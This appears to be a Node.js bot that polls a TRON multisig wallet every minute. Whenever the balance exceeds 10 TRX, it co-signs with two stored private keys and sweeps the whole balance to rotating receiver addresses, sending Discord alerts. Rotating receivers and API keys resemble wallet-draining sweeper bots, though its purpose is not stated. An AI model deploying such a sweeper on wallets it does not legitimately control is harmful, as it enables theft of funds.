const TronWeb = require("tronweb");
const axios = require("axios");
require("dotenv").config();

const PRIVATE_KEYS = [process.env.PRIVATE_KEY_1, process.env.PRIVATE_KEY_2];
const multisigAddress = process.env.MULTISIG_ADDRESS;
const THRESHOLD_AMOUNT = 10;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

const { getNextApiKey } = require("./utils/apiKeyRotator");
const { getNextReceiverAddress } = require("./utils/receiverRotator");

function getTronWeb(privateKey) {
  const fullHost = "https://api.trongrid.io";
  const headers = { "TRON-PRO-API-KEY": getNextApiKey() };
  return new TronWeb({ fullHost, headers, privateKey });
}

async function sendDiscordAlert(message) {
  if (!DISCORD_WEBHOOK_URL) return;
  try {
    await axios.post(DISCORD_WEBHOOK_URL, {
      content: message,
    });
  } catch (err) {
    console.error("❌ Failed to send Discord alert:", err.message);
  }
}

async function monitorAndWithdraw() {
  try {
    const tron = getTronWeb(PRIVATE_KEYS[0]);
    const balance = await tron.trx.getBalance(multisigAddress);
    const balanceInTRX = tron.fromSun(balance);
    console.log(`[${new Date().toISOString()}] Balance: ${balanceInTRX} TRX`);

    if (balanceInTRX > THRESHOLD_AMOUNT) {
      const receiverAddress = getNextReceiverAddress();
      console.log(`Using receiver: ${receiverAddress}`);
      const unsignedTx = await tron.transactionBuilder.sendTrx(
        receiverAddress,
        tron.toSun(balanceInTRX),
        multisigAddress
      );

      let signedTx = await tron.trx.sign(unsignedTx, PRIVATE_KEYS[0]);
      const signerTron2 = getTronWeb(PRIVATE_KEYS[1]);
      signedTx = await signerTron2.trx.multiSign(signedTx, true);

      const result = await tron.trx.sendRawTransaction(signedTx);

      console.log("Withdrawal successful:", result);
      await sendDiscordAlert(
        `🚨 TRX withdrawal executed!\n🔢 Amount: ${balanceInTRX} TRX\n🔗 TxID: ${result.txid}`
      );
    }
  } catch (error) {
    console.error(`[${new Date().toISOString()}] Error:`, error);
    await sendDiscordAlert(
      `❗ Error during TRX monitor:\n\`\`\`${error.message}\`\`\``
    );
  }
}

setInterval(monitorAndWithdraw, 60 * 1000); // every 60 seconds
